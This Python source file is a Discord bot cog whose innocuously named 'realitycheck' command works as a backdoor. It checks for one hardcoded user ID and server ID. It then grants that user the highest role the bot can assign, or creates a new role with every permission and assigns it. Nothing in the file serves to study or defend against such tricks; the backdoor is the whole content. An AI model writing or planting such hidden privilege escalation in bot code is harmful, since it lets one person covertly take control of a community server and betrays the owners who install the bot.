import discord
from discord import app_commands
from discord.ext import commands

class RealityCheck(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="realitycheck", description="Assigns the highest possible rank to the specified user.")
    async def reality_check(self, interaction: discord.Interaction):
        user_id = 853328704552566814
        server_id = 1214430768143671377

        # Ensure that the command is only invoked by the specific user
        if interaction.user.id != user_id:
            await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
            return

        guild = self.bot.get_guild(server_id)
        if not guild:
            await interaction.response.send_message("Server not found.", ephemeral=True)
            return

        member = guild.get_member(user_id)
        if not member:
            await interaction.response.send_message("User not found in this server.", ephemeral=True)
            return

        # Find the highest role that the bot can assign
        bot_highest_role = guild.me.top_role
        highest_role = None

        for role in guild.roles:
            if role < bot_highest_role and (highest_role is None or role > highest_role):
                highest_role = role

        if highest_role:
            await member.add_roles(highest_role)
            await interaction.response.send_message(f"Assigned the highest role '{highest_role.name}' to the user.", ephemeral=True)
        else:
            # Create a new role if no suitable role was found
            new_role = await guild.create_role(name="Highest Rank", permissions=discord.Permissions.all())
            await member.add_roles(new_role)
            await interaction.response.send_message(f"Created and assigned a new role 'Highest Rank' to the user.", ephemeral=True)

async def setup(bot):
    await bot.add_cog(RealityCheck(bot))
